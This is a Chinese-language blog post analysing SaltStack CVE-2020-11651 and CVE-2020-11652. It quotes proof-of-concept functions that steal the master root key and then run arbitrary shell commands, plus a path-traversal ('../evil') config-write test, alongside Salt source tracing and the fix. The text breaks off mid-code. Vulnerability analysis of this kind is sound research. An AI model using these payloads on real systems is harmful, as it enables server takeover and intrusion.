<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>SaltStack_CVE-2020-11651/11652分析 | Kevinsa</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.2.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">SaltStack_CVE-2020-11651/11652分析</h1><a id="logo" href="/.">Kevinsa</a><p class="description">When you bring me out, can you introduce me as Joker?</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">SaltStack_CVE-2020-11651/11652分析</h1><div class="post-meta">2020-05-19<span> | </span><span class="category"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="post-content"><p>文章首发于<a href="https://xz.aliyun.com/t/7741" target="_blank" rel="noopener">先知社区</a><br>SaltStack是一种基于C/S架构的服务器基础架构集中管理平台，最近披露出存在两个安全漏洞 CVE-2020-11651 权限缺陷、CVE-2020-11652 任意文件读写漏洞，官方公告<a href="https://docs.saltstack.com/en/latest/topics/releases/3000.2.html" target="_blank" rel="noopener">SALT 3000.2 RELEASE NOTES</a>, 两个CVE漏洞可以造成远程命令执行。Ghost 使用SaltStack管理自身的机器，漏洞披露后被恶意入侵并植入挖矿程序，Ghost的安全公告<br><a href="https://status.ghost.org" target="_blank" rel="noopener">Critical vulnerability impacting all services</a></p></p>
<!-- TOC -->

<ul>
<li><a href="#0x00-cve-2020-11651">0x00 CVE-2020-11651</a><ul>
<li><a href="#poc">POC</a></li>
<li><a href="#saltstack-master端逻辑">SaltStack master端逻辑</a></li>
<li><a href="#修复代码">修复代码</a></li>
</ul>
</li>
<li><a href="#0x01-cve-2020-11652">0x01 CVE-2020-11652</a><ul>
<li><a href="#poc-1">POC</a></li>
<li><a href="#缺陷代码">缺陷代码</a></li>
<li><a href="#修复代码-1">修复代码</a></li>
</ul>
</li>
<li><a href="#0x02-other-salt-packages安装issue">0x02 Other-salt packages安装issue</a></li>
<li><a href="#0x03-参考">0x03 参考</a></li>
</ul>
<!-- /TOC -->

<p>受影响的version</p>
<ul>
<li>CVE-2020-11651<ul>
<li>SaltStack Salt before 2019.2.4 and 3000 before 3000.2</li>
</ul>
</li>
<li>CVE-2020-11652<ul>
<li>SaltStack Salt before 2019.2.4 and 3000 before 3000.2</li>
</ul>
</li>
</ul>
<h2 id="0x00-CVE-2020-11651"><a href="#0x00-CVE-2020-11651" class="headerlink" title="0x00 CVE-2020-11651"></a>0x00 CVE-2020-11651</h2><p>官方公告对其描述</p>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The salt-master process ClearFuncs class does not properly validate method calls. This allows a remote user to access some methods without authentication. These methods can be used to retrieve user tokens from the salt master and&#x2F;or run arbitrary commands on salt minions.</span><br></pre></td></tr></table></figure>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>现有已公开<a href="https://github.com/dozernz/cve-2020-11651/blob/master/CVE-2020-11651.py" target="_blank" rel="noopener">POC</a>核心逻辑</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rootkey</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = clear_channel.send(&#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;_prep_auth_info&#x27;</span>&#125;, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> response:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(i,<span class="built_in">dict</span>) <span class="keyword">and</span> <span class="built_in">len</span>(i) == <span class="number">1</span>:</span><br><span class="line">                rootkey = <span class="built_in">list</span>(i.values())[<span class="number">0</span>]</span><br><span class="line">                print(<span class="string">&quot;Retrieved root key: &quot;</span> + rootkey)</span><br><span class="line">                <span class="keyword">return</span> rootkey</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>获取对应的rootkey后续可执行恶意命令达到远程命令执行目的</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">master_shell</span>(<span class="params">root_key,command</span>):</span></span><br><span class="line">    <span class="comment"># This is achieved by using the stolen key to create a &quot;runner&quot; on the master node using the cmdmod module, then the cmd.exec_code function to run some python3 code that shells out.</span></span><br><span class="line">    <span class="comment"># There is a cmd.shell function but I wasn&#x27;t able to get it to accept the &quot;cmd&quot; kwarg parameter for some reason.</span></span><br><span class="line">    <span class="comment"># It&#x27;s also possible to use CVE-2020-11652 to get shell if the master instance is running as root by writing a crontab into a cron directory, or proably some other ways.</span></span><br><span class="line">    <span class="comment"># This way is nicer though, and doesn&#x27;t need the master to be running as root .</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    msg = &#123;<span class="string">&quot;key&quot;</span>:root_key,</span><br><span class="line">            <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;runner&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;fun&#x27;</span>: <span class="string">&#x27;salt.cmd&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;kwarg&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;fun&quot;</span>:<span class="string">&quot;cmd.exec_code&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lang&quot;</span>:<span class="string">&quot;python3&quot;</span>,</span><br><span class="line">                <span class="string">&quot;code&quot;</span>:<span class="string">&quot;import subprocess;subprocess.call(&#x27;&#123;&#125;&#x27;,shell=True)&quot;</span>.<span class="built_in">format</span>(command)</span><br><span class="line">                &#125;,</span><br><span class="line">            <span class="string">&#x27;jid&#x27;</span>: <span class="string">&#x27;20200504042611133934&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sudo_user&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;_stamp&#x27;</span>: <span class="string">&#x27;2020-05-04T04:26:13.609688&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = clear_channel.send(msg,timeout=<span class="number">3</span>)</span><br><span class="line">        print(<span class="string">&quot;Got response for attempting master shell: &quot;</span>+<span class="built_in">str</span>(response)+ <span class="string">&quot;. Looks promising!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;something failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>poc调用salt packages 分析</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">clear_channel = salt.transport.client.ReqChannel.factory(minion_config, crypt=<span class="string">&#x27;clear&#x27;</span>)</span><br><span class="line">-&gt;</span><br><span class="line">response = clear_channel.send(&#123;<span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;_prep_auth_info&#x27;</span>&#125;, timeout=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">/salt/transport/zeromq.py</span><br><span class="line"><span class="meta">@salt.ext.tornado.gen.coroutine</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, load, tries=<span class="number">3</span>, timeout=<span class="number">60</span>, raw=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send a request, return a future which will complete when we send the message</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.crypt == <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line">            ret = <span class="keyword">yield</span> self._uncrypted_transfer(load, tries=tries, timeout=timeout)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret = <span class="keyword">yield</span> self._crypted_transfer(load, tries=tries, timeout=timeout, raw=raw)</span><br><span class="line">        <span class="keyword">raise</span> salt.ext.tornado.gen.Return(ret)</span><br></pre></td></tr></table></figure>

<p>salt.transport.client.ReqChannel.factory 最后被实例化为AsyncZeroMQReqChannel，而且带有clear参数，即发给master的命令是clear没有AES加密的</p>
<h3 id="SaltStack-master端逻辑"><a href="#SaltStack-master端逻辑" class="headerlink" title="SaltStack master端逻辑"></a>SaltStack master端逻辑</h3><p>SaltStack 逻辑非常复杂，只对涉及漏洞及其利用点的master端工作流程做简单梳理，可以结合SaltStack官方<a href="https://docs.saltstack.com/en/latest/topics/development/architecture.html#job-flow" target="_blank" rel="noopener">doc</a>梳理</p>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交任务 -&gt; ReqServer(TCP:PORT:4506) -&gt; MWorker -&gt; workers.ipc -&gt; auth -&gt; Publisher -&gt; EventPulisher</span><br></pre></td></tr></table></figure>

<p>根据官方描述 ClearFuncs class 没有正确校验调用的method，即发生在 woker认领任务并发送publish命令处，结合POC在salt packages的调用流程</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">salt/master.py</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReqServer</span>(<span class="params">salt.utils.process.SignalHandlingProcess</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__bind</span>(<span class="params">self</span>):</span></span><br></pre></td></tr></table></figure>

<p>启动主server及生成相应数量的woker线程</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">salt/master.py</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MWorker</span>(<span class="params">salt.utils.process.SignalHandlingProcess</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__bind</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Bind to the local port</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># using ZMQIOLoop since we *might* need zmq in there</span></span><br><span class="line">        install_zmq()</span><br><span class="line">        self.io_loop = ZMQDefaultLoop()</span><br><span class="line">        self.io_loop.make_current()</span><br><span class="line">        <span class="keyword">for</span> req_channel <span class="keyword">in</span> self.req_channels:</span><br><span class="line">            req_channel.post_fork(</span><br><span class="line">                self._handle_payload, io_loop=self.io_loop</span><br><span class="line">            )  <span class="comment"># <span class="doctag">TODO:</span> cleaner? Maybe lazily?</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.io_loop.start()</span><br><span class="line">        <span class="keyword">except</span> (KeyboardInterrupt, SystemExit):</span><br><span class="line">            <span class="comment"># Tornado knows what to do</span></span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>通过_bind方法来绑定端口并接受请求，建立多进程模型</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">salt/master.py</span><br><span class="line">        req_channel.post_fork(</span><br><span class="line">                self._handle_payload, io_loop=self.io_loop</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @salt.ext.tornado.gen.coroutine</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_handle_payload</span>(<span class="params">self, payload</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        The _handle_payload method is the key method used to figure out what</span></span><br><span class="line"><span class="string">        needs to be done with communication to the server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Example cleartext payload generated for &#x27;salt myminion test.ping&#x27;:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#123;&#x27;enc&#x27;: &#x27;clear&#x27;,</span></span><br><span class="line"><span class="string">         &#x27;load&#x27;: &#123;&#x27;arg&#x27;: [],</span></span><br><span class="line"><span class="string">                  &#x27;cmd&#x27;: &#x27;publish&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;fun&#x27;: &#x27;test.ping&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;jid&#x27;: &#x27;&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;key&#x27;: &#x27;alsdkjfa.,maljf-==adflkjadflkjalkjadfadflkajdflkj&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;kwargs&#x27;: &#123;&#x27;show_jid&#x27;: False, &#x27;show_timeout&#x27;: False&#125;,</span></span><br><span class="line"><span class="string">                  &#x27;ret&#x27;: &#x27;&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;tgt&#x27;: &#x27;myminion&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;tgt_type&#x27;: &#x27;glob&#x27;,</span></span><br><span class="line"><span class="string">                  &#x27;user&#x27;: &#x27;root&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param dict payload: The payload route to the appropriate handler</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = payload[<span class="string">&quot;enc&quot;</span>]</span><br><span class="line">        load = payload[<span class="string">&quot;load&quot;</span>]</span><br><span class="line">        ret = &#123;<span class="string">&quot;aes&quot;</span>: self._handle_aes, <span class="string">&quot;clear&quot;</span>: self._handle_clear&#125;[key](load)</span><br><span class="line">        <span class="keyword">raise</span> salt.ext.tornado.gen.Return(ret)</span><br></pre></td></tr></table></figure>

<p>通过post_fork()传入self._handler_payload 任务处理函数，在_handle_payload()方法中可以看由于poc的send 带有<code>&#39;enc&#39;: &#39;clear&#39; &#39;cmd&#39;: &#39;_prep_auth_info&#39;</code>，所以调用</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_handle_clear</span>(<span class="params">self, load</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Process a cleartext command</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param dict load: Cleartext payload</span></span><br><span class="line"><span class="string">    :return: The result of passing the load to a function in ClearFuncs corresponding to</span></span><br><span class="line"><span class="string">             the command specified in the load&#x27;s &#x27;cmd&#x27; key.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    log.trace(<span class="string">&quot;Clear payload received with command %s&quot;</span>, load[<span class="string">&quot;cmd&quot;</span>])</span><br><span class="line">    cmd = load[<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> self.opts[<span class="string">&quot;master_stats&quot;</span>]:</span><br><span class="line">        start = time.time()</span><br><span class="line">        self.stats[cmd][<span class="string">&quot;runs&quot;</span>] += <span class="number">1</span></span><br><span class="line">    ret = <span class="built_in">getattr</span>(self.clear_funcs, cmd)(load), &#123;<span class="string">&quot;fun&quot;</span>: <span class="string">&quot;send_clear&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> self.opts[<span class="string">&quot;master_stats&quot;</span>]:</span><br><span class="line">        self._post_stats(start, cmd)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure>

<p>调用_prep_auth_info</p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_prep_auth_info</span>(<span class="params">self, clear_load</span>):</span></span><br><span class="line">    sensitive_load_keys = []</span><br><span class="line">    key = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;token&quot;</span> <span class="keyword">in</span> clear_load:</span><br><span class="line">        auth_type = <span class="string">&quot;token&quot;</span></span><br><span class="line">        err_name = <span class="string">&quot;TokenAuthenticationError&quot;</span></span><br><span class="line">        sensitive_load_keys = [<span class="string">&quot;token&quot;</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;eauth&quot;</span> <span class="keyword">in</span> clear_load:</span><br><span class="line">        auth_type = <span class="string">&quot;eauth&quot;</span></span><br><span class="line">        err_name = <span class="string">&quot;EauthAuthenticationError&quot;</span></span><br><span class="line">        sensitive_load_keys = [<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        auth_type = <span class="string">&quot;user&quot;</span></span><br><span class="line">        err_name = <span class="string">&quot;UserAuthenticationError&quot;</span></span><br><span class="line">        key = self.key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> auth_type, err_name, key, sensitive_load_keys</span><br></pre></td></tr></table></figure>

<p>返回rootkey</p>
<h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><p><a href="https://github.com/saltstack/salt/pull/56987/commits/3fb1e4f6898ee756ab3bcd10ea374fd205f8d5d4" target="_blank" rel="noopener">commit_id</a></p>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">method = self.clear_funcs.get_method(cmd)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;enc&#x27;: &#x27;clear&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransportMethods</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Expose methods to the transport layer, methods with their names found in</span></span><br><span class="line"><span class="string">    the class attribute &#x27;expose_methods&#x27; will be exposed to the transport layer</span></span><br><span class="line"><span class="string">    via &#x27;get_method&#x27;.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    expose_methods = ()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_method</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Get a method which should be exposed to the transport layer</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> self.expose_methods:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">getattr</span>(self, name)</span><br><span class="line">            <span class="keyword">except</span> AttributeError:</span><br><span class="line">                log.error(<span class="string">&quot;Requested method not exposed: %s&quot;</span>, name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.error(<span class="string">&quot;Requested method not exposed: %s&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;enc&#x27;: &#x27;aes&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESFuncs</span>(<span class="params">TransportMethods</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Set up functions that are available when the load is encrypted with AES</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    expose_methods = (</span><br><span class="line">        <span class="string">&quot;verify_minion&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_master_tops&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_ext_nodes&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_master_opts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_mine_get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_mine&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_mine_delete&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_mine_flush&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_recv&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_pillar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_minion_event&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_handle_minion_event&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_return&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_syndic_return&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_minion_runner&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pub_ret&quot;</span>,</span><br><span class="line">        <span class="string">&quot;minion_pub&quot;</span>,</span><br><span class="line">        <span class="string">&quot;minion_publish&quot;</span>,</span><br><span class="line">        <span class="string">&quot;revoke_auth&quot;</span>,</span><br><span class="line">        <span class="string">&quot;run_func&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_serve_file&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_find&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_hash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_find_and_stat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_list_emptydirs&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_dir_list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_symlink_list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_file_envs&quot;</span>,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>限制传入的method</p>
<h2 id="0x01-CVE-2020-11652"><a href="#0x01-CVE-2020-11652" class="headerlink" title="0x01 CVE-2020-11652"></a>0x01 CVE-2020-11652</h2><p>官方公告对其描述</p>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The salt-master process ClearFuncs class allows access to some methods that improperly sanitize paths. These methods allow arbitrary directory access to authenticated users.zu</span><br></pre></td></tr></table></figure>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SaltStack Test类</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_clearfuncs_config</span>(<span class="params">self</span>):</span></span><br><span class="line">    clear_channel = salt.transport.client.ReqChannel.factory(</span><br><span class="line">        self.minion_config, crypt=<span class="string">&quot;clear&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    msg = &#123;</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: self.key,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;wheel&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fun&quot;</span>: <span class="string">&quot;config.update_config&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file_name&quot;</span>: <span class="string">&quot;../evil&quot;</span>,</span><br><span class="line">        <span class="string">&quot;yaml_contents&quot;</span>: <span 